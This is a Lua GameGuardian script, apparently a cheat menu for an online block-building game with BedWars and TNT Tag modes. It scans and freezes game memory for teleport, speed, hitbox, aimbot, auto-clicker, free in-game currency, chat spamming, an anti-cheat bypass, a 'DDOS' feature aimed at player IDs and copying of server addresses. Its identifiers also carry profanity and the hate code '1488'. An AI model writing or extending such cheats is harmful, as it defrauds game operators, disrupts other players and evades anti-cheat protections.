menuMain = gg.choice({'𝙁𝙪𝙣𝙘𝙩𝙞𝙤𝙣𝙨『📋』','𝘼𝙗𝙤𝙪𝙩 𝙨𝙘𝙧𝙞𝙥𝙩『📄』', '𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙈𝙤𝙙𝙚『👨‍💻』', "𝙁𝙪𝙣𝙘𝙩𝙞𝙤𝙣𝙨 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜?『🔧』", 'Руᴄᴄᴋᴀя ʙᴇᴩᴄия『🇷🇺』','𝙀𝙭𝙞𝙩『⬅️』'},nil, '🔹𝙎𝙚𝙡𝙚𝙘𝙩𝙞𝙤𝙣 𝙢𝙚𝙣𝙪 𝙫1.3')
end
if menuMain then
if menuMain == 1 then MainMenu = false
ActionsMenu = false aga1 = true end
if menuMain == 2 then ScriptInfo() end
if menuMain == 3 then cmd1mode = true commandMode() do return end end
if menuMain == 4 then changeLanguage() aga1 = true do return end end
if menuMain == 5 then exit() end
end
end
function StartUpAlert()
ignoreAlert = true
if StartUp then
StartAlert = gg.alert("Советую прочитать руководство/информацию о скрипте перед использованием.", "Прочитать", "Пропустить", "Назад")
if StartAlert then
if StartAlert == 1 then ignoreAlert = false ScriptInfo() end
if StartAlert == 2 then ignoreAlert = false MagicMenu() end
if StartAlert == 3 then ignoreAlert = false BackMainMenu() end
if ignoreAlert then
StartUpAlert()
ignoreAlert = true
end
end
end
end
StartUp = true
JetPackConfig = false




function color124(c1,c2,c3)
if not getColorUI then
GUIColor()
getColorUI = true
end
if not c1 then
do return end
end
gg.loadResults(rgbB1)
gg.getResults(99999)
gg.editAll(c1,16)
gg.clearResults()
gg.loadResults(rgbB2)
gg.getResults(99999)
gg.editAll(c2,16)
gg.clearResults()
gg.loadResults(rgbB3)
gg.getResults(99999)
gg.editAll(c3,16)
gg.clearResults()
end
function color123(c1,c2,c3)
if not getColorChams then
getRGBVal()
end
j={}
if not c1 then
c1=0.6 end
if not c2 then
c2=0.6 end
if not c3 then
c3=0.6 end
local t=#rgb1
for i=1,t do
j[i]={address=rgb1[i].address,flags=16,freeze=true,value=c1}
j[t+i]={address=rgb2[i].address,flags=16,freeze=true,value=c2}
j[t+t+i]={address=rgb3[i].address,flags=16,freeze=true,value=c3}
end
return j end

function colorCReset()
color123(nil,nil,nil)
end

function getRGBVal()
if not getColorChams then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.clearResults()
gg.searchNumber(-4294967264,32)
t = gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags=4
t[i].address=t[i].address-12
end
gg.loadResults(t)
gg.refineNumber(1,4)
t = gg.getResults(99999)
gg.clearResults()
for i=1,#t do
t[i].flags=16
t[i].address=t[i].address+20
end
gg.loadResults(t)
gg.refineNumber('0.6~1.8',16)
rgb1,rgb2,rgb3=gg.getResults(99999),{},{}
gg.clearResults()
for i=1,#rgb1 do
rgb2[i]={address=rgb1[i].address+16,flags=16,freeze=true,value=0.6}
rgb3[i]={address=rgb1[i].address+32,flags=16,freeze=true,value=0.6}
end
getColorChams = true
end
end

function RGB()
rgbSpeed = gg.prompt({'🔹Скорость RGB\n\nВведи скорость[1—5]:'},{[1]=''},{'number'})
if rgbSpeed then
sprgb=tonumber(rgbSpeed[1],10)
if rgbSpeed[1] == '' then
gg.alert('❗Input не может быть пустым.','')
RGB()
elseif not sprgb then
gg.alert('❗Input должен содержать только цифры integer.','')
RGB()
elseif sprgb < 1 or sprgb > 5 then
gg.alert('❗Input должен содержать число в пределах от 1 до 5. Лимит был нарушен.','')
RGB()
else
sprgb=sprgb*100
gg.setVisible(false)
gg.clearList()
gg.clearResults()
getRGBVal()
timeRGB=0
s=nil
rgbchams=true
end
end
end

function Chat(text,freeze)
if not InputChat then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(';Chat-Input-Box',2,_,_,MainUI['NickSize'].address-0x10000,MainUI['NickSize'].address)gg.refineNumber(';C',2)InputChat=gg.getResults(1)[1].address+0x48 gg.clearResults()
end
if WizardUtf8.len(text)<=32 then
spamspisok,add={},{} 
for i in text:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(spamspisok,t)
end
t=0
for b = 1,WizardUtf8.len(text) do
add[b]={['address']=InputChat+0xA58+t,['flags']=2,['freeze']=true,['value']=spamspisok[b]}t=t+2
end
add[#add+1]={['address']=InputChat+0xA30,['flags']=4,['freeze']=true,['value']=WizardUtf8.len(text)}
add[#add+1]={['address']=InputChat+0x940,['flags']=16,['freeze']=true,['value']=-1}
if not freeze then
gg.addListItems(add)gg.clearList()else for i=1,#add do tsp['spamwz'..i]=add[i] end end
else
return nil
end
end

function colorChams()
colorChamsMenu = true
colorCMenu = gg.choice({'🔸Назад 『⬅️』', '🔹RGB(Радужный)『🌈』','🔹Красный『🟥』','🔹Синий『🟦』','🔹Зелёный『🟩』', '🔹Белый『⬜』','🔹Желтый『🟨』','🔹Розовый『🟪』','🔹Голубой『💠』','🔹Сбросить'},'777', '🔹Цвет игроков (Chams color)『🌈』')
if colorCMenu then
if colorCMenu == 1 then
colorChamsMenu = false
aga1 = true
end
if colorCMenu == 2 then
RGB()
end
if colorCMenu == 3 then
color123(9999,nil,nil)
end
if colorCMenu == 4 then
color123(nil,nil,9999)
end
if colorCMenu == 5 then
color123(nil,9999,nil)
end
if colorCMenu == 6 then
color123(9999,9999,9999)
end
if colorCMenu == 7 then
color123(9999,9999,nil)
end
if colorCMenu == 8 then
color123(9999,nil,9999)
end
if colorCMenu == 9 then
color123(nil,9999,9999)
end
if colorCMenu == 10 then
color123(nil,nil,nil)
end
end
end

function GameCountSystem()
if not code100 then
Checker100()
code100 = true
end
GameC1 = {{address=0,flags=1,value=1}}
GameC0 = {{address=0,flags=1,value=1}}
if not odin100 then
if GameC0[1].value ~= '1' then
JetPackSt = '⚠️'
MenuStatus17 = '⚠️'
MenuStatus6 =  '⚠️'
odin100 = true
end
end
if 1~=1 then
WizardVal1488 = 4575657222478978089
wizardValType = 32
getGameType()
GUI1 = nil
GUI2 = nil
GUI3 = nil
WizardValue=nil
MainUI.PCVersion=nil
GUI4 = nil
getInput = nil
GUI5 = nil
fastonbr=nil
blockres=nil
GUI6 = nil
GUI7 = nil
h118 = nil
getResCmd = nil
getColorChams=nil
j7jK=nil
IsLife = nil
getFrP1 = nil
freezPst = false 
settingRespUI = nil
animFreezeDa = false
getAnim1337 = nil
PcOdin = false
getGui227 = nil
PcOn = false
NoTeam = nil
PCVersionStatus = false
settingNextGUI = nil
PCVerST = '🔴'
getResCmd = nil
gethb=nil
delay=nil
effectoff=nil
GUI8 = nil GUI9 = nil GUI10 = nil
guival = nil
AutoRespawn=false
AutoRespawnVal=nil
AddGUIStatus1 = nil
AddGUIStatus2 = nil
modMenuFalse = true
AddGUIStatus3 = nil
AddGUIStatus4 = nil
AddGUIStatus5 = nil
AddGUIStatus6 = nil
AddGUIStatus7 = nil
AddGUIStatus8 = nil
AddGUIStatus9 = nil
AddGUIStatus10 = nil
MenuStatus7 = '🔴'
MenuStatus8 = '🔴'
MenuStatus9 = '🔴'
MenuStatus10 = '🔴'
MenuStatus11 = '🔴'
MenuStatus12 = '🔴'
MenuStatus13 = '🔴'
MenuStatus14 = '🔴'
MenuStatus15 = '🔴'
MenuStatus16 = '🔴'
GUINum = '🔴'
GUINum1 = 0
reachBl = nil
Val201 = nil
GuiValues = nil
getBlock = nil
RespawnVal = nil
PCVersionStatus = false
AutoClickerStatus = false
NoDelayStatus = false
WWECamStatus = false
FreeCamStatus = false
ReachBlockStatus = false

daActive = false
PCVerST = '🔴'
MenuStatus18 = '🔴'
MenuStatus29 = '🔴'
MenuStatus22 = '🔴'
MenuStatus3 = '🔴'
PValSP = '🔴'
PValSP2 = '🔴'
checkedTeamId = nil
CMD100 = nil
GCount = {{address=0,flags=1,value=1}}
end
end

function getListMenu()
return listST
end

function FreezingMovPackets(val)
gg.setVisible(false)
gg.clearList()
gg.clearResults()
if not getFrP1 then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(1503238553600000,32)
freezP = gg.getResults(99999)
gg.clearResults()
for i,v in pairs(freezP) do
v.flags = 16
v.address = v.address + 0x68
end
getFrP1 = true
end
for i,v in pairs(freezP) do
v.value = val
v.freeze = true
gg.addListItems(freezP)
if val ~= 0 then
gg.clearList()
end
end
end

function freeGc(st)
if not gchave then
gg.clearResults()
gg.clearList()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(20,4)
t = gg.getResults(99999)gg.clearResults()
for i=1,#t do
t[i].address=t[i].address-8
t[i].flags=16
end
gg.loadResults(t)
gg.refineNumber(1,16)
t = gg.getResults(99999)gg.clearResults()
for i=1,#t do
t[i].address=t[i].address+0x58
t[i].flags=4
end
gg.loadResults(t)
gg.getResults(99999)
gg.refineNumber(12,4)t=gg.getResults(99999)
gg.clearResults()
gchave={money={},gcubes={}}
for i=1,#t do
gchave.gcubes[i]={address=t[i].address-0x178,flags=4,freeze=true,value=128732}
gchave.money[i]={address=t[i].address-0xE0,flags=4,freeze=true,value=128732}
end
gg.clearResults()
gg.clearList()
gg.searchNumber(';ToolBar-Currency-',2)
gg.refineNumber(';T',2)t=gg.getResults(99999)gg.clearResults()
for i=1,#t do
t[i].address=t[i].address+0x48
t[i].flags=4
end
gg.loadResults(t)
gg.refineNumber(257,4)
uifree=gg.getResults(99999)gg.clearResults()
end
if st then
freegc=true
else
freegc=false


if #uifree>#gchave.money then
t=#uifree
else
t=#gchave.money
end
for i=1,t do
if i<=#gchave.money then
tsp['gc'..i]={address=gchave.gcubes[i].address,flags=4,freeze=true,value=0}
tsp['mn'..i]={address=gchave.money[i].address,flags=4,freeze=true,value=0}
end
if i<=#uifree then
tsp['UIR'..i]={address=uifree[i].address+0x154,flags=16,freeze=true,value=1}
tsp['UIG'..i]={address=uifree[i].address+0x158,flags=16,freeze=true,value=1}
tsp['UIB'..i]={address=uifree[i].address+0x15c,flags=16,freeze=true,value=1}
end
end

end
end

function WizardResp()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.setVisible(false)gg.clearResults()gg.clearList() gg.searchNumber(112,4) local function getResp() local t=gg.getResults(gg.getResultsCount())for i=1,#t do t[i].address=t[i].address-4 t[i].flags=1 end gg.loadResults(t)gg.refineNumber(1,1)local t=gg.getResults(999999)for i=1,#t do t[i].address=t[i].address-8 t[i].flags=8 end gg.loadResults(t)gg.refineNumber('1~1000000',8)local t=gg.getResults(99999)for i=1,#t do t[i].address=t[i].address+0x10 t[i].flags=1 end gg.loadResults(t)gg.refineNumber(0,1) local t=gg.getResults(99999)gg.clearResults() for i=1,#t do t[i].freeze=true t[i].value=1 end gg.addListItems(t)gg.clearList()gg.sleep(333)end getResp()gg.searchNumber(';DeathSettlement',2)gg.refineNumber(';D',2)local t=gg.getResults(99999) gg.clearResults() for i=1,#t do t[i].address=t[i].address+0x48 t[i].flags=4 end gg.loadResults(t)gg.refineNumber('1~257',4)gg.refineNumber(46,4,_,gg.SIGN_NOT_EQUAL)t=gg.getResults(99999)gg.clearResults()sp={}for i=1,#t do sp[i]={address=t[i].address,flags=4,freeze=true,value=1}sp[#t+i]={address=t[i].address+12,flags=2,freeze=true,value=0}t[i].address=t[i].address-0x2A t[i].flags=2 end gg.addListItems(sp)gg.clearList()gg.loadResults(t)gg.refineNumber(0,2)AutoRespawnVal={address=gg.getResults(1)[1].address+0x2B,flags=1,freeze=true,value=1}gg.clearList()gg.clearResults()end
function getAnimFreeze(st)
if not getanimres then
gg.clearList()gg.clearResults()gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.setVisible(false)gg.searchNumber(':&selectable_action_1',1)gg.refineNumber(':s',1)getanimres=gg.getResults(99999)gg.clearResults()gg.setVisible(false)gg.searchNumber(':b_head',1)gg.refineNumber(':b',1)getanimres2=gg.getResults(99999)gg.clearResults()
end
if st then
else
end
end

MenuStatus1 = '🔴'
MenuStatus2 = '🔴'
MenuStatus3 = '🔴'
MenuStatus4 = '🔴'
MenuStatus5 = '🔴'
MenuStatus6 = '🔴'
MenuStatus17 = '🔴'
MenuStatus18 = '🔴'
MenuStatus22 = '🔴'
MenuStatus29 = '🔴'
JetPackSt = '🟡'
PCVerST = '🔴'
menuStart = 0
function MagicMenu(closeMenu)
if closeMenu then
MainMenu,ChatSpammerOn,SkinMenuOn,ChamsMenuOn,bpMB,CallUIMenu,ActionsMenu=false,false,false,false,false,false,false
end
if credits1337 then
chh=0
credits1337=nil
end
gg.clearList()
if ActionsMenu then
Actions()
elseif CallUIMenu then
CallToGUIMenu()
elseif bpMB then
BedWarsBypassMenu()
elseif ChamsMenuOn then
ChamsMenu()
elseif SkinMenuOn then
SkinChanger()
elseif MainMenu then
MagicMenuMain()
else
aga1 = nil
StartMenu1 = true
menuStart = 1
StartUp = false
if not closeMenu then
if not eng1 then
wizard={
    [1] = '🔹Hack for everyone (Blink)『💤』',
	[2] = '🔹Change view『🔭』',
	[3] = '🔹Break from far away『⛏️』',
	[4] = '🔹Speed menu『⚡』',
	[5] = '🔹Jump height『↑↑↑』',
	[6] = '🔹Teleport by click『☄️👆』',
	[7] = '🔹Teleport by break『☄️👆v2』',
	[8] = '🔹Fly with parachute『🪽🪂』',
	[9] = '🔹Respawn『🌟』',
	[10] = '🔹Teleport by Y-axis『☄️』',
	[11] = '🔹Aim bot & recoil settings『💢⚙』',
	[12] = '🔹Call GUI『📞🌠』',
	[13] = '🔹Server info',
	[14] = '🔹Do not restore blocks',
	[15] = '🔹Hit box v1『💢』',
	[16] = '🔹Check the player',
	[17] = '🔹Hit box v2『💢v2』(Eternal)',
	[18] = '🔹All players ID',
	[19] = '🔹Wzrd frame',
	[20] = '🔹WWE Camera『📷』(*1)',
	[21] = '🔹No delay『⚡💢🟧』',
	[22] = '🔹Rotate right『⚡➡️』',
	[23] = '🔹Auto clicker『💢』',
	[24] = '🔹DDOS penis value',
	[25] = '🔹DDOS Penis',
	[26] = '🔹TNT TAG Potions『🧪』',
	[27] = '🔹Chat control『💬』',
	[28] =_,--47
	[29] = 'RGB text copy',
	[30] = '🔹Gcubes & money',
	[31] = '🔹Test',
	[32] = '🔸Back『⬅️』'
}
menu = gg.multiChoice(wizard,{blinkStatus,null2,ReachBlockStatus,null4,null5,ClickTP,BreakTP,parachuteST,AutoRespawn,null10,null11,null12,null13,blocksst,null15,IgnoreWaterStatus,null17,null18,donttnt,WWECamStatus,NoDelayStatus,null22,AutoClickerStatus,null24,DDOSEnable,null26,spammerwz,null28,null29,freegc,AimKiller,null32,null33}, '🔺Создᴀᴛᴇᴧь ᴄᴋᴩиᴨᴛᴀ: 𝙒𝙞𝙯𝙖𝙧𝙙1488『👑』\n▫️Тᴇᴋущᴀя иᴦᴩᴀ: '..gameName..', Тᴇᴋущᴀя ᴋᴀᴩᴛᴀ: '..myMap..'『📄』\n🔻Текущий пользователь: '..usernickname..'『👤』')
else
wizard={
    [1] = '🔹Invisible (𝘽𝙡𝙞𝙣𝙠)『💤』 ',
	[2] = '🔹Change View『🔭』 ',
	[3] ='🔹Reach Block『⛏️』 ',
	[4] = '🔹Speed Menu『⚡』',
	[5] = '🔹Height Jump『↑↑↑』',
	[6] = '🔹Click TP 『☄️👆』',
	[7] ='🔹Break TP『☄️👆v2』',
	[8] = '🔹Fly Parachute『🪽🪂』',
	[9]='🔹Respawn『🌟』',
	[10] = '🔹Teleport 𝙔『☄️』',
	[11] ='🔹Copy my nickname',-- '🔹Пᴇᴩᴇʍᴇщᴇниᴇ ᴨо оᴄи 𝙔『☄️』',
	[12] = '🔹Call 𝙂𝙐𝙄『📞🌠』',
	[13] = '🔹Info of server',
	[14] = '🔹Air Jump『🪽v2』 ',
	[15] = '🔹Hit Box『💢』',
	[16] = '🔹Ignore Water『💧』 ',
	[17] = '🔹Fast Break(All Blocks)『⛏️』 ',
	[18] =_,
	[19] = '🔹Set Block『🟧』(*1)',
	[20] = '🔹𝙒𝙒𝙀 Camera『📷』(*1) ',
	[21] = '🔹No Delay『⚡💢🟧』',
	[22] = '🔹Spin Player 『⚡➡️』',
	[23] = '🔹Auto Clicker 『💢』 ',
	[24] = '🔹In Next Game 『➡️』',
	[25] = '🔹Aim Bot『💢👤』',
	[26] = '🔹TNT TAG Potions『🧪』',--42
	[27] = '🔹Chat Manager『💬』',--44
	[28] = '🔹TP In Chests (TNT TAG)',--47
	[29] ='RGB text copy',--'🔹TNT TAG Config',--49
	[30] = 'tnt tag timing',--50
	[31] = '🔹test',
	[32] = '🔸Back 『⬅️』'
}
menu = gg.multiChoice(wizard,{blinkStatus,null2,ReachBlockStatus,null4,null5,ClickTP,BreakTP,parachuteST,AutoRespawn,null10,null11,null12,null13,blocksst,null15,IgnoreWaterStatus,fastonbr,null18,null19,WWECamStatus,NoDelayStatus,null22,AutoClickerStatus,null24,aimbotst1,null26,spammerwz,null28,null29,tntTimer,AimKiller,null32,null33}, '🔺Script Creator: 𝙒𝙞𝙯𝙖𝙧𝙙1488『👑』\nCurrent Game: '..gameName..', Current Map: '..myMap..'『📄』\n🔻Current User: '..usernickname..'『👤』')
end
	else
	menu=getListMenu()
	end
if menu then
listST=menu
daActive = false
--------------
if menu[1] and not blinkStatus then
blink(true)
elseif not menu[1] and blinkStatus then
blink(false)
else
--ничего
end
if menu[2] then
View()
end
if menu[3] and not ReachBlockStatus then
ReachBlock(true)
elseif not menu[3] and ReachBlockStatus then
ReachBlock(false)
end
if menu[4] then
SpeedMenu()
end
if menu[5] then
JumpHeight()
end
if menu[6] and not ClickTP then
if not ReachBlockStatus then
ReachBlock(true)
end
if not getBlockZYZ then
ClickTP1()
end
gg.addListItems({Main10['ClickTP']})gg.clearList()
ClickTP=true
elseif not menu[6] and ClickTP then
ClickTP=false
end
--[[if menu[39] and not FlyDevST then
FlyDev()
elseif not menu[39] and FlyDevST then
FlyDev(nil,true)
end]]
if menu[8] and not parachuteST then
FlyParachute()
elseif not menu[8] and parachuteST then
parachuteST=false
gg.addListItems({{address=Mag6[1].address+0x544,flags=4,freeze=true,value=0},{address=Mag6[1].address+0x4B0+0xc0,flags=1,freeze=true,value=1},{address=Mag6[1].address+0x54A,flags=1,freeze=true,value=0}})
gg.clearList()
end
--[[if menu[9] then
FlyParaplane()
end]]
if menu[10] then
TpY()
end
if menu[12] then
CallToGUIMenu()
end
if menu[13] then
gg.alert('Server IP:'..IpServer..' , Server Port:'..Open.Port.value,access1488)
gg.copyText(IpServer)
gg.sleep(100)
gg.copyText(Open.Port.value)
gg.sleep(100)
gg.copyText(access1488)
end
if menu[14] and not blocksst then
delBlocks(true)
elseif not menu[14] and blocksst then
delBlocks(false)
end
if menu[15] then
HitBox()
end
if menu[18] then
t=getAllPlayers(true)
sp={}
for i=1,#t do
sp['id'..i]={address=t[i].address+0x458,flags=32}
sp['gender'..i]={address=t[i].address+0x688,flags=4}
end
sp,list=gg.getValues(sp),'1.ID: '..Open.MyID.value..' | '..MyGender..' | '..usernickname..'\n'
for i=2,#t+1 do
if sp['gender'..i-1].value==1 then
g='♂️' else g='♀️' end
list=list..i..'.ID: '..sp['id'..i-1].value..' | '..g..'\n'
end
g=gg.alert(list,'Скопировать список')
if g and g==1 then
gg.copyText(list)
end
end
if menu[17] then
hitboxv2()
end
if menu[16] then
getPlSt()
end
if menu[9] and not AutoRespawn then
AutoRespawn = true
if not AutoRespawnVal then
WizardResp()
end
elseif not menu[9] and AutoRespawn then
AutoRespawn = false
--[[color124(nil)
gg.setVisible(false)
while true do
color124(0,1,0)
color124(1,1,0)
color124(1,0,1)
color124(1,0,0)
color124(0,1,1)
color124(0,0,1)
color124(0,0,0)
color124(1,1,1)
end
--AddGUI()]]
end
if menu[19] then
addRamka()
end
if menu[20] and not WWECamStatus then
WWECam(true)
WWECamStatus=true
elseif not menu[20] and WWECamStatus then
WWECam(false)
WWECamStatus=false
end
if menu[21] and not NoDelayStatus then
NoDelay(true)
elseif not menu[21] and NoDelayStatus then
NoDelay(false)
else
--ничего
end
if menu[22] then
RightRotation()
end
if menu[23] and not AutoClickerStatus then
Main10['CurrentAim']={address=WizardValue[1].address-412,flags=4}
AutoClickerStatus=true
elseif not menu[23] and AutoClickerStatus then
AutoClickerStatus=false
end
if menu[24] then
t=gg.prompt({'ddos penis value'},{999999},{'number'})
if t and tonumber(t[1],10) then
tsp.enable228={address=Mag6[1].address+0x320,flags=4,freeze=true,value=t[1]}
end
end
if menu[25] and not DDOSEnable then
DDOSByUID()
end

if menu[45] then
CallToGUITool(10)
end

if menu[41] then
BowSpeed()
end


if menu[26] then
TNTTAGPotions()
end

if menu[46] then
MineReset()
end

if menu[28] then
end

if menu[29] then
gg.copyText('&$[ffca00ff-fbd33fff-cad2ceff-23b8feff-677dffff-ac61ffff-fd15ffff]$\btext\b$&')
end

if menu[30] and not freegc then
freeGc(true)
elseif not menu[30] and freegc then
freeGc(false)
end


if menu[7] and not BreakTP then
if not getBlockZYZ then
ClickTP1()
end
BreakTP=true
elseif not menu[7] and BreakTP then
BreakTP=false
end

if menu[27] and not spammerwz then
spammerwz=true
elseif not menu[27] and spammerwz then
spammerwz=false
Chat('',false)
end
if menu[31] then
gg.clearList()gg.setVisible(false)gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()gg.searchNumber(':ToolBar.json',1)gg.refineNumber(':T',1)w=gg.getResults(69)gg.clearResults()if #w==1 then tsp.rmshit={address=w[1].address+0x73,flags=1,freeze=true,value=1} else for i=1,#w do w[i].address=w[i].address+0x6f w[i].flags=4 end gg.loadResults(w)gg.refineNumber('0~1488',4)tsp.rmshit={address=gg.getResults(1)[1].address+4,flags=1,freeze=true,value=1}gg.clearResults()end
end
if menu[11] then
t = gg.multiChoice(staim.sp,{staim.st.dteam,staim.st.sex1,staim.st.sex2,staim.st.tnt})
if t then
if t[1] and not staim.st.dteam then
staim.st.dteam=true
elseif not t[1] and staim.st.dteam then
staim.st.dteam=false
end
if t[2] and not staim.st.sex1 then
staim.st.sex1=true
elseif not t[2] and staim.st.sex1 then
staim.st.sex1=false
end
if t[3] and not staim.st.sex2 then
staim.st.sex2=true
elseif not t[3] and staim.st.sex2 then
staim.st.sex2=false
end
if t[4] and not staim.st.tnt then
staim.st.tnt=true
elseif not t[4] and staim.st.tnt then
staim.st.tnt=false
end
end
end
if menu[32] then
BackMainMenu()
end
----------
end
end
if aga1 then
aga1 = false
MagicMenu()
end
end

function rebornMenu()
tsp={}
for b = 1,80 do
tsp['penistext'..b]={['address']=MainUI['btmtext'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=0}
tsp['penistextt'..b]={['address']=MainUI['btmtext2'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=0}t=t+2
end
tsp.penislll={address=getMainXa+0x24,flags=16,freeze=true,value=0.3}
gg.addListItems(tsp)gg.clearList()
while true do
t=gg.getValues({Open['Game']})
if t[1].value == 1 then
gg.sleep(500)
main1237()
wizard089=nil
Wizard089()
break
end
end
end
StartMenu1 = false

MainMenu = true
function main1237()
getMainMain()
gg.searchNumber("32;1::17", 4,_, gg.SIGN_EQUAL, UI4[1].address+0, UI4[1].address + 10000)gg.refineNumber(32,4)
wzrd1337 = gg.getResults(1)[1].address
raznica = (wzrd1337-UI4[1].address-8) - 0x878
values()
GameCountSystem()
getModMenu()
GetWizardValue()
color123(nil,nil,nil)
Main10['UI.Spectator']=UI6[1]
clientChecker()

if not maxHP then
error=nil
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()gg.searchNumber(';PlayerInfo-Health-Number',2,_,_,MainUI.UpdateMain.address,MainUI.UpdateMain.address+0x20000)gg.refineNumber(';P')local lh=gg.getResults(1) if #lh~=0 then local lenh=gg.getValues({{address=lh[1].address+0x8c0+raznica,flags=4}})[1].value if lenh>1 then spl={} for i=1,lenh do spl[i]={address=lh[1].address+0x8e6+raznica+i*2,flags=2} end spl,sp2l,chl=gg.getValues(spl),{},nil for i=1,lenh do if chl then sp2l[#sp2l+1]=spl[i] end if spl[i].value==47 then chl=true end end maxHP=UTF_8(sp2l) else error=true end else error=true end if error or not tonumber(maxHP) then maxHP=20 end end gg.clearResults()

if BedWarGame and not bypassBed then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32) gg.clearResults()gg.searchNumber(350000,4)bypassBed=gg.getResults(1)[1].address gg.clearResults()
Main10.BedWarBP={address=bypassBed+0x64,flags=16,freeze=true,value=0}
end
end
function SosiHuy()
t={}
table.insert(t,{address=Mag6[1].address+-168,flags=16,freeze=true,value=0})
table.insert(t,{address=Mag6[1].address+-164,flags=16,freeze=true,value=0})
table.insert(t,{address=Mag6[1].address+-160,flags=16,freeze=true,value=0})
table.insert(t,fpsst[1])
table.insert(t,{address=Mag6[1].address+0x138,flags=64})
table.insert(t,{address=Mag6[1].address+0x604,flags=4})
table.insert(t,{address=Mag6[1].address+-184,flags=2})
table.insert(t,{address=Mag6[1].address+0x7E0,flags=4,freeze=true,value=2001})
table.insert(t,{address=Mag6[1].address+0x544,flags=16})
table.insert(t,{address=Mag6[1].address+-156,flags=16,freeze=true,value=0})
table.insert(t,{address=Mag6[1].address+-152,flags=16,freeze=true,value=0})
table.insert(t,{address=Mag6[1].address+-148,flags=16,freeze=true,value=0})
--Main10['Btn2.click']=copyid5[1]
--0.893782383 , 0.347222222
Main10['Parachute']={address=UI7[1].address+0xA18+raznica,flags=1}
Main10['ParachuteSt']={address=UI7[1].address+12,flags=2}
Main10.ParachuteCR={address=Mag6[1].address+0x54A,flags=1}
Main10['JumpSt']=MainUI['JumpSt']
Main10['WizardAttack']={address=MainUI['wizardtnt2'].address+0xA18+raznica,flags=1}
Main10['Fishing']=MainUI['Fishing']
Main10['RGB']={address=MainUI.Fishing.address+0xA18+raznica,flags=1}
Main10['FlyUpSp']={address=MainUI['FlyUp'].address+0x830+raznica,flags=4,freeze=true,value=0}
Main10.BowUI=MainUI.BowUI
Main10['Нажатие']=MainUI['AutoClicker']
Main10.wzrdgun={address=MainUI.GunReload.address+0xA18+raznica,flags=1,freeze=true,value=0}
Main10['FlyDownSp']={address=MainUI['FlyDown'].address+0x830+raznica,flags=4,freeze=true,value=0}
Main10['NickSize']={address=MainUI['NickSize'].address+0x830+raznica,flags=16}
Main10.yaw={address=Mag6[1].address-192,flags=16}
Main10.pitch={address=Mag6[1].address-188,flags=16}
Main10.armSkin={address=Mag6[1].address+0x548,flags=4}
Main10.generalSp={address=Mag6[1].address+0x240,flags=16}
Main10.Gender={address=Mag6[1].address+0x688,flags=4}
Main10.ResetAndTp={address=MainUI.TP.address+0xA18+raznica,flags=1}
Main10['PRP']={address=Mag1[1].address+0x6E8,flags=16,freeze=true,value=-1}
Main10.PRP2={address=Mag1[1].address+0x61c+8+0xc0,flags=16,freeze=true,value=0}
Main10['CurrentAnim']={address=Mag1[1].address+0x3fc,flags=4,freeze=true,value=0}
Main10['HB1']={address=Mag1[1].address-0x34,flags=16,freeze=true,value=0.6}
Main10.RazmerNika={address=Mag1[1].address+0x320,flags=4}
wzrdramka=nil
Main10['HB2']={address=Mag1[1].address-0xD0,flags=16,freeze=true,value=0.6}
Main10['HB3']={address=Mag1[1].address-0x74,flags=16,freeze=true,value=1.8}
Main10['NoClip']={address=Mag1[1].address-172,flags=4,freeze=true,value=0}
Main10.TeamId={address=Mag1[1].address+0x380,flags=4,freeze=true,value=0}
Main10['Paraplane']={address=Mag1[1].address+0x6E3,flags=1}
Main10.MyID={address=Mag1[1].address+0x458,flags=32}
Main10['Eating']={address=Mag1[1].address+0x370,flags=1,freeze=true,value=0}
Main10['1.62']={address=Mag1[1].address,flags=16}
Main10.ArmSt={address=Mag1[1].address+0x248,flags=2,freeze=true,value=0}
MainUI.AutoReload={address=Mag1[1].address+0x268,flags=4,freeze=true,value=1}
MainUI.FastReload={address=Mag1[1].address+0x26c,flags=4,freeze=true,value=999999}
Main10.Shot1={address=MainUI['GunRight'].address+0xA18+raznica,flags=1}
Main10.Shot2={address=MainUI['GunLeft'].address+0xA18+raznica,flags=1}
Main10.Fun={address=Main10.GunPreviewCheckBox.address+0xA18+raznica,flags=1}
Main10.Break={address=MainUI.WarBlock.address+0xA18+raznica,flags=1}
Main10['movX']={address=Mag1[1].address-204,flags=16,freeze=true,value=0}
Main10['FlyActive']={address=Mag1[1].address+0x545,flags=1}
Main10['SwimST']={address=Mag1[1].address-444,flags=4}
Main10['movY']={address=Main10['movX'].address+4,flags=16,freeze=true,value=0}
Main10['movZ']={address=Main10['movX'].address+8,flags=16,freeze=true,value=0}
Main10['Client']=client[1]
Main10['GunMain']=MainUI['GunMain']
Main10.wzrdIcon=MainUI.wzrdIcon
--Main10['MainAttackBtn']=MainUI['MainAttackBtn']
Main10['MainAttackBtn']=MainUI['BtnAttack']
Main10['AttackX']={address=MainUI['BtnAttackImg'].address+0xA0,flags=16}
Main10['SkillX']={address=MainUI['SkillBtn'].address+0xA0,flags=16}
Main10['SkillY']={address=MainUI['SkillBtn'].address+0xA4,flags=16}
Main10['AttackY']={address=MainUI['BtnAttackImg'].address+0xA4,flags=16}
Main10['AttackSt']={address=MainUI['BtnAttack'].address+0x90,flags=16}
Main10.Skill=MainUI['SkillMain']
Main10.SpeedOff=MainUI['wizardtnt3']
Main10.SpeedOn=MainUI['wizardtnt4']
Main10['X']=t[1]
Main10['Y']=t[2]
Main10['Z']=t[3]
Main10['FPS']=t[4]
Main10['Game']=gameReset2[1]
Main10['HP']=t[5]
Main10['Wings']=t[6]
Main10['Ground']=t[7]
Main10.ClientFreeze={address=Mag1[1].address+0x54C,flags=16,freeze=true,value=0}
